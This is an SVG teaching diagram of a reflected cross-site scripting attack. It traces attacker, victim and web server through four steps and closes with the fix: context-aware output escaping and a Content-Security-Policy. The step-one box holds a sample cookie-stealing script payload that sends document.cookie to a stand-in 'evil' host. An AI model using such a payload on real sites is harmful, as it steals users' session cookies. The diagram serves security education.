<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 920 460" font-family="Segoe UI, Arial, sans-serif">
  <rect width="920" height="460" fill="#0d1117"/>
  <text x="460" y="34" fill="#f78166" font-size="22" font-weight="700" text-anchor="middle">Reflected XSS</text>
  <text x="460" y="56" fill="#8b949e" font-size="13" text-anchor="middle">Payload rides in the request and is echoed straight back in the response — not stored.</text>

  <defs>
    <marker id="a" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#f78166"/></marker>
    <marker id="g" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8b949e"/></marker>
    <g id="person">
      <circle cx="0" cy="-16" r="12"/>
      <path d="M-18,20 Q-18,-2 0,-2 Q18,-2 18,20 Z"/>
    </g>
  </defs>

  <!-- Attacker -->
  <use href="#person" transform="translate(70,110)" fill="#f85149"/>
  <text x="70" y="150" fill="#f85149" font-size="13" font-weight="700" text-anchor="middle">Attacker</text>

  <!-- Victim -->
  <use href="#person" transform="translate(70,320)" fill="#58a6ff"/>
  <text x="70" y="360" fill="#58a6ff" font-size="13" font-weight="700" text-anchor="middle">Victim</text>

  <!-- Server -->
  <rect x="700" y="200" width="150" height="90" rx="10" fill="#161b22" stroke="#3fb950" stroke-width="2"/>
  <text x="775" y="235" fill="#3fb950" font-size="14" font-weight="700" text-anchor="middle">Web Server</text>
  <text x="775" y="258" fill="#8b949e" font-size="11" text-anchor="middle">search page</text>
  <text x="775" y="275" fill="#8b949e" font-size="11" text-anchor="middle">echoes ?q= back</text>

  <!-- Step 1: craft & send link -->
  <path d="M92,108 Q300,60 700,215" fill="none" stroke="#f78166" stroke-width="2" marker-end="url(#a)"/>
  <text x="360" y="82" fill="#f78166" font-size="11">1 · Emails a crafted link to the victim</text>
  <rect x="250" y="120" width="430" height="26" rx="5" fill="#161b22" stroke="#30363d"/>
  <text x="262" y="138" fill="#e6edf3" font-size="11" font-family="Consolas, monospace">site.com/search?q=&lt;script&gt;fetch('evil?c='+document.cookie)&lt;/script&gt;</text>

  <!-- Step 2: victim clicks -->
  <path d="M92,315 Q400,360 700,275" fill="none" stroke="#8b949e" stroke-width="2" marker-end="url(#g)"/>
  <text x="300" y="392" fill="#8b949e" font-size="11">2 · Victim clicks — browser sends the request with the script</text>

  <!-- Step 3: reflected response -->
  <path d="M700,255 Q380,270 92,318" fill="none" stroke="#f78166" stroke-width="2" stroke-dasharray="6,4" marker-end="url(#a)"/>
  <text x="330" y="300" fill="#f78166" font-size="11">3 · Server reflects q into the HTML response</text>

  <!-- Step 4: execution -->
  <rect x="150" y="405" width="620" height="40" rx="8" fill="#161b22" stroke="#f85149" stroke-width="2"/>
  <text x="460" y="424" fill="#f85149" font-size="12" font-weight="700" text-anchor="middle">4 · Victim's browser executes the script → cookie stolen and sent to attacker</text>
  <text x="460" y="440" fill="#8b949e" font-size="10" text-anchor="middle">Fix: escape output for its context · Content-Security-Policy</text>
</svg>
